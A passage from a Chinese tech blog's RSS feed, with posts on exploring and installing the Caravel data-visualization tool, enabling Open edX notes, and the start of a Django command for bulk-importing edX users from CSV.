&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/caravel_demo_mainccb9413c.png" /&gt;&lt;/p&gt;
&lt;p&gt;填写数据信息&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/caravel_demo_main65e7c6e5.png" /&gt;&lt;/p&gt;
&lt;p&gt;完成后点击&lt;code&gt;Test Connection&lt;/code&gt;,底部将列出数据库中所有的数据表&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/caravel_demo_main45b437b8.png" /&gt;&lt;/p&gt;
&lt;h3&gt;添加表&lt;/h3&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/caravel_demo_table79220d59.png" /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/caravel_demo_table0734672c.png" /&gt;&lt;/p&gt;
&lt;p&gt;注意到图片上方有3个tab页，分别为：Detail、List Table Column和List Sql Metric,默认打开Detail（如上）&lt;/p&gt;
&lt;p&gt;List Table Column:
&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/caravel_table606ba397.png" /&gt;&lt;/p&gt;
&lt;p&gt;List Table Column中的操作决定，各个字段可以做哪些操作(操作类型有,Groupable(分组),Filterable（过滤）,Count Distinct(统计有多少种不同值),Sum（求和），Min（最小值），Max（最大值）  Is tempora（是否是时间序列字段）)，如果你熟悉SQL，你应该一眼就能看懂什么意思&lt;/p&gt;
&lt;p&gt;值得注意的是表中必须有一个日期或时间类型的字段&lt;/p&gt;
&lt;p&gt;List Sql Metric:&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/caravel_tablefe9a074f.png" /&gt;&lt;/p&gt;
&lt;p&gt;Metrics意为度量，做统计时，时常会遇到这个词，折腾elk是就遇到&lt;/p&gt;
&lt;p&gt;Druid.io文档中有：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Metric columns: Metrics are columns used in aggregations and computations. In our example, the metrics are clicks and price. Metrics are usually numeric values, and computations include operations such as count, sum, and mean. Also known as measures in standard OLAP terminology.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;在List Sql Metric页面，可以编辑和定义指标，如果上面对一些字段勾选了Sum、Min、Max、Count Distinct选项，则这里会自动生成相应的指标字段。&lt;/p&gt;
&lt;h3&gt;可视化探索&lt;/h3&gt;
&lt;p&gt;我们以table为中心，这里我们已经定义好了birch_names表的维度字段和指标,下边我们可以开始对它进行探索&lt;/p&gt;
&lt;p&gt;开始探索&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/caravel_table3d6d5109.png" /&gt;&lt;/p&gt;
&lt;p&gt;在页面中，可以针对birch_names事先定义的字段和指标字段进行可视化探索。&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/caravel_table985b1aa2.png" /&gt;&lt;/p&gt;
&lt;p&gt;下边是我们探索的一个成果，是不同名字的变化时序图&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/caravel_table3cf9cdfa.png" /&gt;&lt;/p&gt;
&lt;p&gt;实际上它是以下SQL的可视化&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/caravel_table_sqlddb06dfe.png" /&gt;&lt;/p&gt;
&lt;p&gt;而我们在左边面板选择参数的过程就是动态生成SQL语句的过程&lt;/p&gt;
&lt;h3&gt;收获探索成果&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;将探索结果导出为JSON或是CSV&lt;/li&gt;
&lt;li&gt;将探索的成果保存为slide，之后可以分享给同伴&lt;ul&gt;
&lt;li&gt;将slide拼接为dashboard（就是这篇文章最初的那幅图）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;将探索成果生成iframe嵌入到其他页面里（当报表用）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/caravel_sharee4e2dcc7.png" /&gt;&lt;/p&gt;
&lt;p&gt;我们带现连自适应也做的很好&lt;/p&gt;
&lt;h1&gt;坑&lt;/h1&gt;
&lt;h3&gt;生成iframe&lt;/h3&gt;
&lt;p&gt;直接分享url没有问题，而iframe的尺寸有问题（caravel版本为0.10.0）&lt;/p&gt;
&lt;h1&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://airbnb.io/caravel/tutorial.html"&gt;tutorial&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://lxw1234.com/archives/2016/06/681.htm"&gt;Caravel–一款开源OLAP+数据可视化分析前端工具，支持Druid和Kylin&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 26 Jul 2016 00:00:00 +0000</pubDate><guid>tag:,2016-07-26:caravel-demo-analysis.html</guid><category>data</category></item><item><title>caravel系列之安装与入门</title><link>/caravel-startup-and-install.html</link><description>&lt;p&gt;&lt;img alt="caravel" src="http://i.imgur.com/H0Kyvyi.jpg" /&gt;&lt;/p&gt;
&lt;h1&gt;caravel是什么&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;Caravel is an open source data visualization platform that provides easy exploration of your data and allows you to create and share beautiful charts and dashboards&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;caravel是Airbnb开源的一款数据可视化和探索工具，使用caravel用户可以轻松对数据进行可视化分析。&lt;/p&gt;
&lt;h1&gt;一图胜千言&lt;/h1&gt;
&lt;p&gt;&lt;img alt="" src="http://airbnb.io/caravel/_images/line.png" /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://airbnb.io/caravel/_images/bubble.png" /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://airbnb.io/caravel/_images/world_map.png" /&gt;&lt;/p&gt;
&lt;h1&gt;使用场景&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;数据库可视化分析&lt;/li&gt;
&lt;li&gt;数据模式套索&lt;/li&gt;
&lt;li&gt;BI&lt;/li&gt;
&lt;li&gt;数据报表与可视化图表&lt;/li&gt;
&lt;li&gt;tableau的开源替代&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;功能特性&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;丰富的可视化组件（集成最优秀的可视化图表库）&lt;/li&gt;
&lt;li&gt;创建和分享数据可视化互动仪表盘&lt;/li&gt;
&lt;li&gt;灵活的权限模型, 方面控制数据的可见度&lt;/li&gt;
&lt;li&gt;方便企业使用的用户验证机制，支持 database, OpenID, LDAP, OAuth和 REMOTE_USER (通过 Flask AppBuilder）&lt;/li&gt;
&lt;li&gt;简洁的语义层，可以控制数据资源在 UI 的展现方式&lt;/li&gt;
&lt;li&gt;通过SqlAlchemy可接入大多数据库&lt;/li&gt;
&lt;li&gt;与 Druid.io 的深度集成，可以方便处理大规模数据集&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;demo尝试&lt;/h1&gt;
&lt;p&gt;&lt;a href="http://caravel.just4fun.site/login/"&gt;demo&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;用户名/密码：test/test&lt;/p&gt;
&lt;h1&gt;安装&lt;/h1&gt;
&lt;p&gt;根据&lt;a href="http://airbnb.io/caravel/installation.html"&gt;官方文档&lt;/a&gt;，caravel目前只支持python2.7，将来会支持python3&lt;/p&gt;
&lt;p&gt;我们在此演示Ubuntu下的安装，其他系统可以参考官方文档&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# OS dependencies&lt;/span&gt;
sudo apt-get install build-essential libssl-dev libffi-dev python-dev python-pip

&lt;span class="c1"&gt;# create virtual env and use it&lt;/span&gt;
sudo pip virtualenv -i http://mirrors.aliyun.com/pypi/simple/
virtualenv caravel_env
. caravel_env/bin/activate

&lt;span class="c1"&gt;# Install caravel&lt;/span&gt;
pip install caravel &lt;span class="c1"&gt;# 推荐使用anaconda&lt;/span&gt;

&lt;span class="c1"&gt;# Create an admin user&lt;/span&gt;
fabmanager create-admin --app caravel

&lt;span class="c1"&gt;# Initialize the database&lt;/span&gt;
caravel db upgrade

&lt;span class="c1"&gt;# Create default roles and permissions&lt;/span&gt;
caravel init

&lt;span class="c1"&gt;# Load some data to play with&lt;/span&gt;
caravel load_examples

&lt;span class="c1"&gt;# Start the web server on port 8088&lt;/span&gt;
caravel runserver -p 8088

&lt;span class="c1"&gt;# To start a development web server, use the -d switch&lt;/span&gt;
caravel runserver -d &lt;span class="c1"&gt;#建议使用tmux来跑，默认可通过0.0.0.0:8088访问&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;如果你熟悉docker，你可以使用docker安装&lt;/p&gt;
&lt;h3&gt;使用docker安装&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;docker run --name caravel -d -p 8088:8088 amancevice/caravel&lt;/code&gt;，之后&lt;code&gt;docker exec -it caravel demo&lt;/code&gt;,初始化用户 ,细节参考 &lt;a href="https://hub.docker.com/r/amancevice/caravel/"&gt;dockerhub amancevice/caravel&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;caravel被映射到本地的8088端口，之后可以用nginx反向代理把它映射出去，nginx中配置如下&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;server {
        listen 80;             #端口
        server_name caravel.just4fun.site;   #访问域名
        access_log /tmp/access.log;
        error_log /tmp/access.log;
        location / {
                proxy_set_header X-Forward-For $proxy_add_x_forwarded_for;
                proxy_set_header Host $http_host;
                proxy_redirect off;
                if (!-f $request_filename) {
                        proxy_pass http://127.0.0.1:8088;  
                        break;
                }
        }
}
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;支持的数据源&lt;/h1&gt;
&lt;p&gt;目前通过相关的python驱动支持大多主流数据仓库：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;MySQL&lt;/li&gt;
&lt;li&gt;Postgres&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/prestodb/presto"&gt;Presto&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Oracle&lt;/li&gt;
&lt;li&gt;sqlite&lt;/li&gt;
&lt;li&gt;Redshift&lt;/li&gt;
&lt;li&gt;MSSQL&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/cloudera/Impala"&gt;Impala&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;相关依赖和更多细节可以参考官方文档：&lt;a href="http://airbnb.io/caravel/installation.html#database-dependencies"&gt;Database dependencies&lt;/a&gt;,或者&lt;a href="https://github.com/zzzeek/sqlalchemy"&gt;sqlalchemy&lt;/a&gt;的文档：&lt;a href="http://docs.sqlalchemy.org/en/rel_1_0/core/engines.html"&gt;Engine Configuration&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;其中Presto,Redshift和Impala可能需要做个介绍.&lt;/p&gt;
&lt;h4&gt;Presto&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;Distributed SQL query engine for big data&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;通过&lt;a href="https://github.com/dropbox/PyHive"&gt;PyHive&lt;/a&gt;,我们能用sqlalchemy操作presto数据库，这样依赖我们就可以解决海量数据的SQL查询问题，presto支持PB级别的查询&lt;/p&gt;
&lt;h4&gt;Redshift&lt;/h4&gt;
&lt;p&gt;Amazon Redshift 是一种可轻松扩展的完全托管型 PB 级数据仓库服务i&lt;/p&gt;
&lt;h4&gt;Impala&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;Lightning-fast, distributed SQL queries for petabytes of data stored in Apache Hadoop clusters&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;分布式大数据SQL查询&lt;/h1&gt;
&lt;p&gt;如果我们的数据仓库存储海量的数据，直接查询数据库是低效的,caravel已经与Druid.io深度整合.对于大数据集可以采用Druid.io或是以上的解决方案&lt;/p&gt;
&lt;h1&gt;原理&lt;/h1&gt;
&lt;p&gt;这部分直接引用@lxw1234的&lt;a href="http://lxw1234.com/archives/2016/06/681.htm"&gt;这篇文章&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Caravel通过将界面的操作转换成SQL语句，提交给SQLAlchemy适配数据源查询并返回结果，对于Druid，Caravel将界面的操作转换成Druid的API进行查询并返回结果，与Druid的深度集成，可以实现大规模海量数据的OLAP分析和实时探索。&lt;/p&gt;
&lt;p&gt;另外，为了提高并发查询下的性能，还支持数据缓存，可配置将数据缓存至Redis、Memcache或者本地文件系统。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;坑&lt;/h1&gt;
&lt;h3&gt;登录问题&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;新建用户无法登录，后端会说权限不够,无提示信息.猜测是用户系统尚未启用.目前是用fabmanager(Flask App Builder)后创建的的admin&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://airbnb.io/caravel/index.html"&gt;caravel documentation&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/airbnb/caravel"&gt;caravel github&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/prestodb/presto"&gt;presto&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="http://prestodb-china.com/index.html"&gt;国内社区与文档&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;京东开放的版本&lt;a href="https://github.com/CHINA-JD/presto/"&gt;presto&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;京东已实现presto到oracle的连接:http://prestodb-china.com/faq.html&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://prestodb-china.com/resources.html"&gt;prestodb-china.&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/analytically/hadoop-ansible"&gt;ansble安装脚本&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://lxw1234.com/archives/2016/06/681.htm"&gt;Caravel–一款开源OLAP+数据可视化分析前端工具，支持Druid和Kylin&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 26 Jul 2016 00:00:00 +0000</pubDate><guid>tag:,2016-07-26:caravel-startup-and-install.html</guid><category>data</category></item><item><title>Open-edx笔记系统尝鲜</title><link>/try-open-edx-note-system-in-cloud.html</link><description>&lt;h1&gt;前言&lt;/h1&gt;
&lt;p&gt;我此前写过几篇笔记系统相关的文章：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://blog.just4fun.site/use-notes-in-cypress.html"&gt;在edX Cypress中启用notes功能&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.just4fun.site/open-edx-note-system.html"&gt;Open edx笔记系统探究&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;一图胜千言&lt;/h1&gt;
&lt;p&gt;&lt;img alt="笔记前端" src="https://leanote.com/api/file/getImage?fileId=57909fc0ab644133ed01bee0" /&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;&lt;img alt="搜索" src="https://leanote.com/api/file/getImage?fileId=57909f9dab644133ed01bede" /&gt;&lt;/p&gt;
&lt;h1&gt;使用我的笔记服务&lt;/h1&gt;
&lt;p&gt;之前搭建了一个笔记云服务，hack了许多代码（实际上弃用了安全保护机制，不建议大家这样做），已经面目全非，和官方版本相去甚远，建议大家笔记后端使用官方版本（估计下个版本就有了）&lt;/p&gt;
&lt;h3&gt;edx-platform中要做的配置&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;git checkout 70d57327eb3f592067cabb2b4655088101266bcd -- /edx/app/edxapp/edx-platform/lms/djangoapps/edxnotes/helpers.py&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;sudo /edx/bin/python.edxapp /edx/bin/manage.edxapp lms --setting=aws create_oauth2_client https://note.just4fun.site https://note.just4fun.site/complete/edx-oidc/ confidential --client_name edx-notes --client_id edx-notes-id --client_secret edx-notes-secret --trusted&lt;/li&gt;
&lt;li&gt;修改/edx/app/edxapp/lms.env.json,使&lt;code&gt;ENABLE_EDXNOTES&lt;/code&gt;为true,在EDXNOTES_INTERNAL_API和EDXNOTES_PUBLIC_API都填入&lt;code&gt;https://note.just4fun.site/api/v1&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;修改/edx/app/edxapp/cms.env.json,使&lt;code&gt;ENABLE_EDXNOTES&lt;/code&gt;为true&lt;/li&gt;
&lt;li&gt;在studio中进入课程的高级设置，启用笔记选项&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img alt="高级设置" src="https://leanote.com/api/file/getImage?fileId=57909e08ab644133ed01bec4" /&gt;&lt;/p&gt;
&lt;h3&gt;申请使用&lt;/h3&gt;
&lt;p&gt;把你的lms-url发我邮箱，我把你的lms-url加入白名单&lt;/p&gt;
&lt;h3&gt;坑&lt;/h3&gt;
&lt;p&gt;需要先对内容批注，才能查阅/搜索笔记，否则可能报错&lt;/p&gt;
&lt;h1&gt;后记&lt;/h1&gt;
&lt;h3&gt;一些git的使用技巧&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;git show commit_id //显示一次提交的细节&lt;/li&gt;
&lt;li&gt;gitk filename //查看一个文件的历史&lt;/li&gt;
&lt;li&gt;git checkout commit_id -- filename //重置某个文件&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://openedx.atlassian.net/wiki/display/OpenOPS/How+to+Get+edX+Notes+Running"&gt;How to Get edX Notes Running&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Thu, 21 Jul 2016 00:00:00 +0000</pubDate><guid>tag:,2016-07-21:try-open-edx-note-system-in-cloud.html</guid><category>edx</category></item><item><title>为edX批量导入用户</title><link>/edx-user-import.html</link><description>&lt;p&gt;--更新于：2016-07-13&lt;/p&gt;
&lt;p&gt;近期重写这部分，使其成为&lt;code&gt;django management command&lt;/code&gt; (在dogwood版本下测试可用)&lt;/p&gt;
&lt;p&gt;原因有二，其一是之前所用的功能函数不完备,随着对edx的了解深入，想用更安全的函数来完成批量注册功能，其二是希望做到更好的内聚性&lt;/p&gt;
&lt;p&gt;这部分是从我的&lt;a href="https://github.com/wwj718/edx_siteapi"&gt;edx_siteapi&lt;/a&gt;抽出的一个功能模块，edx_siteapi项目试图把edx的一些功能变为RESTful api接口(类似canvas做的)，供外部系统调用和整合，有兴趣的小伙伴可以关注这个项目&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;在搭建edX的时候，可能面临一个这样的需求：批量导入学生作为用户。&lt;br /&gt;
即便是采用cas注册这个需求可能依旧存在，校内系统可能存有用户课程关系，需要预先导入,所以用户实体需要预先存在系统中，而cas是一种首次登录才注册的机制  &lt;/p&gt;
&lt;p&gt;有时我们可能需要批量从既有数据库中导入用户，尤其是将Open edX用于SPOC中时&lt;/p&gt;
&lt;p&gt;在此给出一个可行的解决方案。&lt;/p&gt;
&lt;h2&gt;大体思路&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;从校方数据库中导出用户文件(csv格式)&lt;/li&gt;
&lt;li&gt;写脚本从csv文件中取得所需的字段（诸如学号，姓名）&lt;/li&gt;
&lt;li&gt;使用&lt;code&gt;django management command&lt;/code&gt;将用户导入系统（利用django management command能调用django上下文的机制，这也是此次更新的主要地方）&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;实施细节&lt;/h2&gt;
&lt;p&gt;我们假设从数据库导出的文件student.csv 如下&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;姓名,学号,email,专业,班级
张三,201011,zs@qq.com,热能动力工程,动力1007班
李四,201012,ls@qq.com,热能动力工程,动力1008班
王五,201013,ww@qq.com,热能动力工程,动力1009班
...
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;注意逗号前后的空格是有影响的！&lt;/p&gt;
&lt;h3&gt;编写脚本&lt;/h3&gt;
&lt;p&gt;在任意django app目录下创建&lt;code&gt;management/commands/create_user_from_csv.py&lt;/code&gt;,先上代码&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env python&lt;/span&gt;
&lt;span class="c1"&gt;# encoding: utf-8&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;optparse&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;make_option&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;django.core.management.base&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;BaseCommand&lt;/span&gt;

&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;student.forms&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;AccountCreationForm&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;student.models&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;create_comments_service_user&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;student.views&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;_do_create_account&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;AccountValidationError&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;track.management.tracked_command&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;TrackedCommand&lt;/span&gt;
&lt;span class="c1"&gt;# 解析csv&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;unicodecsv&lt;/span&gt;  &lt;span class="c1"&gt;# utf-8 ,也可以用pandas:&lt;/span&gt;


&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;create_user&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;email&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;form&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;AccountCreationForm&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="s1"&gt;&amp;#39;username&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="s1"&gt;&amp;#39;email&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;email&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="s1"&gt;&amp;#39;password&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="s1"&gt;&amp;#39;name&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="p"&gt;},&lt;/span&gt;
                               &lt;span class="n"&gt;tos_required&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;False&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;_&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;reg&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;_do_create_account&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;form&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;reg&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;activate&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
        &lt;span class="n"&gt;reg&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;save&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
        &lt;span class="c1"&gt;#create_comments_service_user(user) #这会促发网络请求&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;user&lt;/span&gt;
    &lt;span class="k"&gt;except&lt;/span&gt; &lt;span class="n"&gt;AccountValidationError&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;message&lt;/span&gt;


&lt;span class="c1"&gt;# wget https://raw.githubusercontent.com/edx/edx-platform/named-release/dogwood.rc/common/djangoapps/student/management/commands/create_user.py&lt;/span&gt;
&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Command&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;TrackedCommand&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;help&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
&lt;span class="s2"&gt;    example:&lt;/span&gt;
&lt;span class="s2"&gt;        # Enroll a user test@example.com into the demo course&lt;/span&gt;
&lt;span class="s2"&gt;        # The username and name will default to &amp;quot;test&amp;quot;&lt;/span&gt;
&lt;span class="s2"&gt;        sudo -u www-data /edx/bin/python.edxapp /edx/app/edxapp/edx-platform/manage.py lms create_user_from_csv --help --settings devstack&lt;/span&gt;
&lt;span class="s2"&gt;        sudo -u www-data /edx/bin/python.edxapp /edx/app/edxapp/edx-platform/manage.py lms create_user_from_csv --csv /edx/app/edxapp/edx-platform/lms/djangoapps/siteapi/student.csv --settings devstack&lt;/span&gt;
&lt;span class="s2"&gt;    &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
    &lt;span class="n"&gt;help&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;u&amp;quot;批量导入用户&amp;quot;&lt;/span&gt;
    &lt;span class="n"&gt;option_list&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;BaseCommand&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;option_list&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
        &lt;span class="n"&gt;make_option&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;-c&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;--csv&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#采用绝对路径&lt;/span&gt;
                    &lt;span class="n"&gt;metavar&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;CSV&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                    &lt;span class="n"&gt;dest&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;csv&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                    &lt;span class="n"&gt;default&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                    &lt;span class="n"&gt;help&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;u&amp;#39;用户注册表&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
